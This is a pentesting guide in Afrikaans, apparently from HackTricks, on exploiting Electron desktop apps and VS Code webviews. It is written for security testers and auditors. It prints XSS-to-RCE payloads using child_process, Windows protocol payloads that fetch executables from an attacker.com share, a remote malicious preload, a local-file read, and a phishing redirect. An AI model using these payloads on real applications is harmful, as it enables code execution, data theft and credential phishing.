# Electron-rekenaartoepassings

{{#include ../../banners/hacktricks-training.md}}

## Inleiding

Electron kombineer ’n bevoorregte **Node.js**-hoofproses met **Chromium**-weergaweprosesse. Electron is nie ’n webblaaier nie: toepassingskode kan doelbewus vermoëns soos toegang tot die lêerstelsel en shell blootstel, daarom vereis die laai van onbetroubare inhoud strenger grensontwerp as ’n gewone webwerf.<sup>[[21]](#references)</sup>

Electron-toepassingskode word gewoonlik in ’n `.asar`-argief verpak. Pak dit uit voordat jy die bronkode nagaan:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Die toepassing se `package.json` identifiseer sy hoofingangspunt. Daardie lêer skep gewoonlik renderer-vensters en stel hul sekuriteitsensitiewe `webPreferences` in.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron het twee primêre prosestipes:

- Hoofproses (het volledige toegang tot NodeJS)
- Renderer-proses (behoort om veiligheidsredes beperkte toegang tot NodeJS te hê)

![Electron Desktop Apps - Inleiding: Renderer-proses (behoort om veiligheidsredes beperkte toegang tot NodeJS te hê)](<../../images/image (182).png>)

’n **renderer-proses** sal ’n blaaiervenster wees wat ’n lêer laai:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

Die **main process** konfigureer elke renderer-proses, gewoonlik wanneer ’n `BrowserWindow` geskep word. Veilige instellings verminder die kans dat ’n kompromittering van die renderer-proses tot native code execution kan lei, maar maak nie onbetroubare inhoud inherent veilig nie.<sup>[[21]](#references)[[22]](#references)</sup>

Gaan ten minste hierdie renderer-voorkeure na:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** is by verstek `false`. As dit geaktiveer word, kry JavaScript in die renderer toegang tot Node.js-API’s en word daardie renderer se sandbox ook gedeaktiveer.
- **`contextIsolation`** is by verstek `true`. Dit skei die bladsy se JavaScript-konteks van die konteks wat deur preload-skripte en Electron-internals gebruik word.
- **`preload`** het geen verstekpad nie. ’n Gekonfigureerde preload-skrip loop voor bladsyskripte en kan beperkingsomvang-API’s deur `contextBridge` beskikbaar stel.
- **`sandbox`** is by verstek `true` sedert Electron 20. Dit beperk renderer-toegang tot bedryfstelselbronne; as `nodeIntegration: true` gestel word, word dit gedeaktiveer.
- **`nodeIntegrationInWorker`** is by verstek `false` en beheer Node.js-integrasie in Web Workers.
- **`nodeIntegrationInSubFrames`** is by verstek `false`.
  - As **`nodeIntegration`** **geaktiveer** is, laat dit die gebruik van **Node.js-API’s** toe in webblaaie wat **in iframes** binne ’n Electron-toepassing gelaai word.
  - As **`nodeIntegration`** **gedeaktiveer** is, sal preloads in die iframe laai.

Voorbeeld van ’n konfigurasie:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Sommige **RCE payloads** van [hier](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Vang verkeer vas

Wysig die start-main-konfigurasie en voeg die gebruik van ’n proxy by, soos:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Statiese ASAR-na-native-grensnasporing met REA

**REA** kan ’n ASAR of onttrekte toepassingsgids lees sonder om die JavaScript-bootstrap daarvan uit te voer. Die toepassingsgrafiek teken package-ingangspunte, gebundelde modules, `BrowserWindow`- en preload-instellings, `contextBridge`-lede, IPC-registrasies, versoeke om native add-ons en source map-identiteite aan. Dit bied ’n beginpunt om ’n renderer-blootgestelde vermoë na ’n bevoorregte hoofproses-hanteerder na te spoor.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Vir ’n letterlike kenmerkstring, gee die volledige Evidence-rekord as application deur en vervang die seed met een wat in die teiken waargeneem is:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Dieselfde `trace_application_feature`-werkvloei aanvaar ook ’n waargenome letterlike API-lid, IPC-kanaal of module as saad. Gaan die resulterende handler-pad, validasiekandidate en native oordrag na aan die hand van die teruggekeerde bronliggings. ’n Renderer-`invoke` pas slegs by een unieke `ipcMain.handle`/`handleOnce`-kandidaat op presies dieselfde letterlike kanaal; `send` vereis eweneens een unieke `ipcMain.on`/`once`/`addListener`-kandidaat. Dinamiese of dubbele handlers bly onopgelos. ’n Aangevraagde `.node`-lid is nie ’n geverifieerde native uitvoer nie; ooreenstemmende Hopper/Ghidra-bewyse moet dieselfde artefakdigest hê voordat dié gevolgtrekking gemaak word. Statiese bereikbaarheid bewys ook nie dat die pad uitgevoer is nie.<sup>[[24]](#references)[[25]](#references)</sup>

Vir die vertrouensgrens tussen renderer en main en handler-validering, sien [Electron contextIsolation RCE via IPC](electron-contextisolation-rce-via-ipc.md).

Vir native opvolgwerk wat aan die verskaffer gekoppel is, sien [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Electron-aanvalsoppervlak vir outomatiese opdaterings

Vir integriteit van vrystellingsfeeds, rollback, verwarring oor ondertekende kanale en TOCTOU met stellingslêers, sien [Electron auto-update trust boundaries](electron-auto-update-trust-boundaries.md).

## Electron-plaaslike kode-inspuiting

Met plaaslike skryf- of instrumentasietoegang tot ’n geïnstalleerde app, sien [Electron local code injection and snapshot tampering](electron-local-code-injection-and-snapshot-tampering.md) vir ASAR-/main-proses- en V8-snapshot-paaie, plus die OS-spesifieke skakels.

## RCE: XSS + nodeIntegration

As **nodeIntegration** op **on** gestel is, kan ’n webblad se JavaScript maklik Node.js-kenmerke gebruik deur bloot `require()` aan te roep. Die manier om byvoorbeeld die calc-toepassing op Windows uit te voer, is:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Die script wat in hierdie instelling aangedui word, word **voor ander scripts in die renderer gelaai**, dus het dit **onbeperkte toegang tot Node APIs**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Daarom kan die skrip node-features na bladsye uitvoer:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **As `contextIsolation` aan is, sal dit nie werk nie**

## RCE: XSS + contextIsolation

Die _**contextIsolation**_ skep **geskeide kontekste tussen die webblad se skripte en Electron se interne JavaScript-kode**, sodat die JavaScript-uitvoering van elkeen nie die ander beïnvloed nie. Dit is ’n noodsaaklike kenmerk om die moontlikheid van RCE uit te skakel.

As die kontekste nie geïsoleer is nie, kan ’n aanvaller:

1. **Arbitrêre JavaScript in renderer uitvoer** (XSS of navigasie na eksterne webwerwe)
2. **Die ingeboude metode oorskryf** wat in preload- of Electron se interne kode gebruik word, en dit met ’n eie funksie vervang
3. **Die gebruik van die oorskryfde funksie aktiveer**
4. RCE?

Daar is 2 plekke waar ingeboude metodes oorskryf kan word: In preload-kode of in Electron se interne kode:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Omseiling van klikgebeurtenis

As daar beperkings geld wanneer jy op ’n skakel klik, kan jy dit dalk **omseil deur middelklik te gebruik** in plaas van ’n gewone linksklik.

```javascript
window.addEventListener('click', (e) => {
```

## RCE via shell.openExternal

Vir meer inligting oor hierdie voorbeelde, kyk na [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) en [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Wanneer ’n Electron-rekenaartoepassing ontplooi word, is dit noodsaaklik om te verseker dat die korrekte instellings vir `nodeIntegration` en `contextIsolation` gebruik word. Daar is vasgestel dat **client-side remote code execution (RCE)** wat op preload-skrifte of Electron se native code vanaf die main process gerig is, in die praktyk met hierdie instellings voorkom word.

Wanneer ’n gebruiker met skakels interaksie het of nuwe vensters oopmaak, word spesifieke gebeurtenisluisteraars geaktiveer, wat noodsaaklik is vir die toepassing se sekuriteit en funksionaliteit:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Hierdie listeners word **deur die desktop application oorheers** om sy eie **besigheidslogika** te implementeer. Die toepassing bepaal of ’n skakel waarheen navigeer is intern of in ’n eksterne webblaaier oopgemaak moet word. Hierdie besluit word tipies deur ’n funksie, `openInternally`, geneem. As hierdie funksie `false` teruggee, dui dit aan dat die skakel ekstern oopgemaak moet word deur die `shell.openExternal`-funksie te gebruik.

**Hier is vereenvoudigde pseudokode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Electron JS-sekuriteitsbeste praktyke raai af om onbetroubare inhoud met die `openExternal`-funksie te aanvaar, aangesien dit via verskeie protokolle tot RCE kan lei. Bedryfstelsels ondersteun verskillende protokolle wat RCE kan veroorsaak. Vir gedetailleerde voorbeelde en verdere verduideliking oor hierdie onderwerp, kan jy [hierdie bron](https://positive.security/blog/url-open-rce#windows-10-19042) raadpleeg, wat Windows-protokolvoorbeelde bevat wat hierdie kwesbaarheid kan uitbuit.<sup>[[10]](#references)</sup>

In macos kan die `openExternal`-funksie uitgebuit word om arbitrêre opdragte uit te voer, soos in `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Voorbeelde van Windows-protokoluitbuiting sluit in:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Hierdie kwesbaarheid kan gevind word in **[hierdie verslag](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

Die **webviewTag** is ’n **verouderde funksie** wat die gebruik van **NodeJS** in die **renderer process** toelaat. Dit behoort gedeaktiveer te word, aangesien dit ’n script binne die preload context kan laai, soos:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Daarom kan 'n aanvaller wat daarin slaag om 'n arbitrêre bladsy te laai, daardie tag gebruik om 'n **arbitrêre preload script te laai**.

Hierdie preload script is toe misbruik om 'n **kwesbare IPC-diens (`skype-new-window`) aan te roep**, wat **`shell.openExternal`** aangeroep het om RCE te verkry:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Lees van interne lêers: XSS + contextIsolation

**As jy `contextIsolation` deaktiveer, kan jy `<webview>`-merkers gebruik**, soortgelyk aan `<iframe>`, om plaaslike lêers te lees en uit te lek. ’n Voorbeeld demonstreer hoe om hierdie kwesbaarheid te misbruik om die inhoud van interne lêers te lees:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Lees van interne lêers: XSS + contextIsolation: As jy contextIsolation deaktiveer, kan jy merkers gebruik, soortgelyk aan , om...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Verder word ’n ander metode gedeel om **’n interne lêer te lees**, wat ’n kritieke kwesbaarheid vir die lees van plaaslike lêers in ’n Electron-rekenaartoepassing uitlig. Dit behels dat ’n script ingespuit word om die toepassing te misbruik en data uit te lek:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Ou Chromium**

As die **Chromium**-weergawe wat saam met die toepassing gebundel is oud is en bekende kwesbaarhede het, kan dit moontlik wees om dit uit te buit en XSS in RCE te omskep.<sup>[[20]](#references)</sup>\
Jy kan ’n voorbeeld in hierdie **writeup** sien: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **XSS Phishing deur interne URL regex bypass**

As jy XSS vind maar **nie RCE kan aktiveer of interne lêers kan steel nie**, kan jy steeds probeer om **geloofsbriewe deur phishing te steel**.<sup>[[1]](#references)</sup>

Inspekteer eers die frontend-kode om te bepaal wat gebeur wanneer ’n nuwe URL oopgemaak word:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Die oproep na **`openInternally`** bepaal of ’n platformskakel in die **lessenaarvenster** oopmaak, of ’n derdepartyhulpbron in die stelselblaaier oopmaak.

As die URL-allowlist-regex van die funksie omseil kan word—byvoorbeeld omdat punte in ’n gasheernaam nie escaped is nie—kan ’n aanvaller XSS misbruik om ’n geloofwaardige aanmeldbesonderhede-prompt op infrastruktuur onder die aanvaller se beheer oop te maak:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://`-protokol

Soos genoem in [die Electron-sekuriteitsgids](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), kry bladsye wat op **`file://`** loop breë lêertoegang. Gevolglik kan **XSS gebruik word om willekeurige lêers** van die gebruiker se masjien af te laai. ’n Korrek ontwerpte **custom protocol** kan toegang tot ’n spesifieke stel lêers beperk.<sup>[[21]](#references)</sup>

## Remote module

Die Electron Remote-module laat **renderer-prosesse toe om toegang tot hoofproses-API's te kry**, wat kommunikasie binne ’n Electron-toepassing vergemaklik. Die aktivering van hierdie module hou egter aansienlike sekuriteitsrisiko's in. Dit vergroot die toepassing se aanvaloppervlak, wat dit meer vatbaar maak vir kwesbaarhede soos cross-site scripting (XSS)-aanvalle.

> [!TIP]
> Hoewel die **remote**-module sommige API's van die hoofproses aan renderer-prosesse blootstel, is dit nie eenvoudig om RCE te kry deur net die komponente te misbruik nie. Die komponente kan egter sensitiewe inligting blootstel.

> [!WARNING]
> Baie toepassings wat steeds die remote-module gebruik, doen dit op ’n manier wat vereis dat NodeIntegration in die renderer-proses geaktiveer is, wat ’n **groot sekuriteitsrisiko** is.

Electron se ingeboude `remote`-module is afgekeur en later verwyder; toepassings wat steeds die model daarvan nodig het, kan die aparte `@electron/remote`-pakket gebruik. Vermy die blootstelling van remote-agtige vermoëns aan onbetroubare renderers weens die sekuriteits- en werkverrigtingsimplikasies.

Met `@electron/remote` moet dit eers **in die hoofproses geïnisialiseer word**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Die renderer-proses kan dan voorwerpe uit die module invoer:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

Die **[blogplasing](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** wys op ’n paar interessante **funksies** wat deur die objek **`app`** van die remote-module blootgestel word:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Herbegin** die toepassing deur die huidige instansie te **verlaat** en ’n nuwe een te **begin**. Nuttig vir **app-opdaterings** of beduidende **toestandveranderinge**.
- **`app.setAppLogsPath([path])`**  
   - **Definieer** of **skep** ’n gids waarin **app-logboeke** gestoor word. Die logboeke kan met **`app.getPath()`** of **`app.setPath(pathName, newPath)`** **verkry** of **gewysig** word.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Registreer** die huidige uitvoerbare lêer as die **verstekhanteerder** vir ’n gespesifiseerde **protokol**. Indien nodig, kan jy ’n **pasgemaakte pad** en **argumente** verskaf.
- **`app.setUserTasks(tasks)`**  
   - **Voeg** take by die **Tasks-kategorie** in die **Jump List** (op Windows). Elke taak kan bepaal hoe die toepassing **begin** of watter **argumente** deurgegee word.
- **`app.importCertificate(options, callback)`**  
   - **Voer** ’n **PKCS#12-sertifikaat** in die stelsel se **sertifikaatbewaarplek** in (slegs Linux). ’n **callback** kan gebruik word om die resultaat te hanteer.
- **`app.moveToApplicationsFolder([options])`**  
   - **Skuif** die toepassing na die **Toepassings-lêergids** (op macOS). Dit help om ’n **standaardinstallasie** vir Mac-gebruikers te verseker.
- **`app.setJumpList(categories)`**  
   - **Stel** ’n **pasgemaakte Jump List** op Windows in of **verwyder** dit. Jy kan **kategorieë** spesifiseer om te orden hoe take aan die gebruiker vertoon word.
- **`app.setLoginItemSettings(settings)`**  
   - **Stel in** watter **uitvoerbare lêers** saam met hul **opsies** by **aanmelding** begin (slegs macOS en Windows).
  
Voorbeeld:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## systemPreferences-module

Die **primêre API** om toegang tot stelselvoorkeure te verkry en **stelselgebeurtenisse uit te stuur** in Electron. Metodes soos **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** en **setUserDefault** is almal **deel van** hierdie module.

**Voorbeeldgebruik:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Luister** na **native macOS-kennisgewings** met NSDistributedNotificationCenter.  
* Voor **macOS Catalina** kon jy **alle** verspreide kennisgewings onderskep deur **nil** aan CFNotificationCenterAddObserver deur te gee.  
* Ná **Catalina / Big Sur** kan sandboxed apps steeds op **baie gebeurtenisse** (byvoorbeeld **skermsluitings/-ontsluitings**, **volumemonterings**, **netwerkaktiwiteit**, ens.) **inteken** deur kennisgewings **op naam** te registreer.

### **getUserDefault / setUserDefault**

* **Koppel** aan **NSUserDefaults**, wat **toepassings-** of **globale** voorkeure op macOS stoor.
    
* **getUserDefault** kan sensitiewe inligting **herwin**, soos **onlangse lêerliggings** of die **geografiese ligging van die gebruiker**.
    
* **setUserDefault** kan hierdie voorkeure **verander**, wat moontlik ’n app se **opstelling** beïnvloed.
    
* In **ouer Electron-weergawes** (voor v8.3.0) was slegs die **standaardsuite** van NSUserDefaults **toeganklik**.

## Shell.showItemInFolder

Hierdie funksie wys die gegewe lêer in ’n lêerbestuurder. Op geaffekteerde platforms en weergawes kon daardie interaksie **die lêer outomaties uitvoer**.

Vir meer inligting, kyk na [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Inhoudsekuriteitsbeleid

Electron-apps behoort ’n **Content Security Policy (CSP)** te hê om **XSS-aanvalle te voorkom**. Die **CSP** is ’n **sekuriteitstandaard** wat help om die **uitvoering** van **onbetroubare kode** in die blaaier te **voorkom**.

Dit word gewoonlik in die **`main.js`**-lêer of in die **`index.html`**-sjabloon **opgestel**, met die CSP binne ’n **meta-tag**.

Vir meer inligting, kyk na:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Hierdie werklike aanvalsketting het Visual Studio Code 1.63 (CVE-2021-43908) geraak en wys hoe ’n enkele markdown-gedrewe XSS in ’n webview tot volle RCE geëskaleer kan word wanneer CSP, postMessage en skemahanteerders verkeerd opgestel is. Openbare PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Oorsig van die aanvalsketting
- Eerste XSS via webview CSP: Die gegenereerde CSP het `style-src 'self' 'unsafe-inline'` ingesluit, wat inline-/stylgebaseerde inspuiting in ’n `vscode-webview://`-konteks toegelaat het. Die payload het ’n beacon na `/stealID` gestuur om die teiken-webview se extensionId te eksfiltreer.
- Bou van die teiken-webview-URL: Gebruik die leaked ID om `vscode-webview://<extensionId>/.../<publicUrl>` te bou.
- Tweede XSS via postMessage-vertroue: Die buitenste webview het `window.postMessage` vertrou sonder streng oorsprong-/tipe-kontroles en aanvaller-HTML met `allowScripts: true` gelaai.
- Laai van plaaslike lêers via skema-/padherskrywing: Die payload het `file:///...` na `vscode-file://vscode-app/...` herskryf en `exploit.md` met `RCE.html` vervang, deur swak padvalidering uit te buit om ’n bevoorregte plaaslike hulpbron te laai.
- RCE in ’n Node-geaktiveerde konteks: Die gelaaide HTML is uitgevoer met Node-API’s beskikbaar, wat uitvoering van OS-opdragte moontlik gemaak het.

Voorbeeld van ’n RCE-primitief in die finale konteks
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Verwante leesstof oor vertrouenskwessies met postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: sintetiese webview-kortpaaie + deklaratiewe uitbreiding-opdragbrûe

’n Ander klas VS Code-webview-ontsnappings het in Junie 2026 na vore gekom: **onvertroude JavaScript binne ’n notebook-/voorskou-webview kon bevoorregte globale kortpaaie sintetiseer** omdat die webview-preload `keydown`-data na die gasheer-workbench aangestuur het, en die gasheer dit as werklike gebruikersinvoer hanteer het.<sup>[[14]](#references)</sup>

Dit is deel van ’n breër geskiedenis van IDE-aanvalle op vertrouensgrense waarin projekbeheerde inhoud bevoorregte redigeerderkenmerke bereik.<sup>[[19]](#references)</sup>

### Grensfaling

As ’n kruis-oorsprong-/sandboxed webview sleutelbordvelde wat deur ’n aanvaller beheer word (`key`, `code`, `keyCode`, wysigers, `repeat`) na ’n bevoorregte `postMessage`-/message-port-brug kopieer **sonder om `event.isTrusted` na te gaan**, kan JavaScript binne die webview workbench-kortpaaie uitvoer met:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Dit is veral nuttig wanneer **sintetiese tikwerk deur die blaaier geblokkeer word**. Geskripte sleutelgebeurtenisse kan gewoonlik **nie arbitrêre teks in HTML-`<input>`-elemente tik nie**, maar hulle aktiveer steeds kortpaaie wat `keydown` direk verwerk.

### Praktiese misbruikpatrone

- **Misbruik van kortpadgerigte UI:** teiken globale bindings, soos die aanvaarding van kennisgewings, navigasie deur palette, aktivering van gefokusde knoppies of beweging deur spyskaarte, eerder as om opdragte te probeer tik.
- **Voorspelbare bevoorregte aanporboodskappe vanaf werkruimtemetadata:** ’n bewaarplekbeheerde `.vscode/extensions.json` kan ’n aanvalleruitbreiding aanbeveel en ’n voorspelbare installasiekennisgewing skep wat met ’n kortpad soos `Ctrl+Shift+A` aanvaar kan word.
- **Deklaratiewe uitbreidingsmanifes as opdragbrug:** selfs al word plaaslike werkruimte-uitbreidingskode deur CSP in web VS Code geblokkeer, kan deklaratiewe `package.json`-bydraes steeds gelaai word. ’n Plaaslike uitbreiding onder `.vscode/extensions` kan ’n sleutelbinding registreer wat `runCommands` aanroep, gevolg deur ’n bevoorregte interne opdrag soos `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Voorbeeld van ’n manifespatroon:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Versteekte sekuriteitsvlae bereikbaar via onbetroubare metadata:** as die interne command aanvallerbeheerde argumente soos `{"context":{"skipPublisherTrust":true}}` aanvaar, kan verklarende metadata ’n vertrouensdialoog onderdruk en ’n Marketplace-/CDN-gehoste uitbreiding installeer wat uiteindelik aanvallerkode uitvoer.
- **Misbruik van vertroude werkruimtes:** as afgeleë/webwerkruimtes outomaties vertrou word, word plaaslike werkruimte-uitbreidings ’n waardevolle brug vanaf bewaarplek-inhoud na bevoorregte redigeerderhandelinge.
- **Omvangvergroting ná kompromittering:** inspekteer ná uitbreidinguitvoering watter tokens die redigeerder aan uitbreidings blootstel. In `github.dev` was die gesteelde GitHub-token geldig buite die oopgemaakte bewaarplek, dus het ’n navraag na `https://api.github.com/user/repos` bykomende toeganklike private bewaarplekke gelys.

### Ouditnotas

- Behandel **invoer-aanstuur van webview na host** as ’n voorregtegrens; moenie sintetiese sleutel-/klikgebeurtenisse vanaf onbetroubare rame weer na die host stuur nie.
- Dwing magtiging **binne** sensitiewe commands af. Moenie konteks vir commands aanvaar wat deur die oproeper verskaf word en interne vlae soos `skipPublisherTrust` kan stel nie.
- Moenie aanvaar dat dit genoeg is om uitvoerbare plaaslike uitbreidingskode te blokkeer nie; hersien ook **verklarende bydraes** (`keybindings`, `menus`, `commands`, take) uit werkruimtebeheerde manifeste.
- Die regstellings van 3 Junie 2026 het `isTrusted` by aangestuurde gebeurtenisse gevoeg, die aanstuur van onbetroubare sleutels in notebook-webviews gedeaktiveer en opgehou om konteks vir install-commands te aanvaar wat deur oproepers verskaf is.<sup>[[16]](#references)[[17]](#references)</sup>

## **Gereedskap**

Die saamgestelde **awesome-electronjs-hacking**-versameling bied bykomende navorsing, gereedskap en hulpbronne oor kwesbare toepassings.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) is ’n hulpmiddel om wankonfigurasies en sekuriteitsteenpatrone in Electron-gebaseerde toepassings te identifiseer.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) is ’n oopbron-VS Code-inprop vir Electron-toepassings wat Electronegativity gebruik.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) kontroleer vir kwesbare derdeparty-biblioteke.
- [**Electro.ng**](https://electro.ng/) is ’n kommersiële Electron-sekuriteitsontledingshulpmiddel.

## Laboratoriums

By [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) kan jy ’n laboratorium vind om kwesbare Electron-toepassings uit te buit.<sup>[[4]](#references)</sup>

Hierdie commands help jou om deur die laboratorium te werk:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

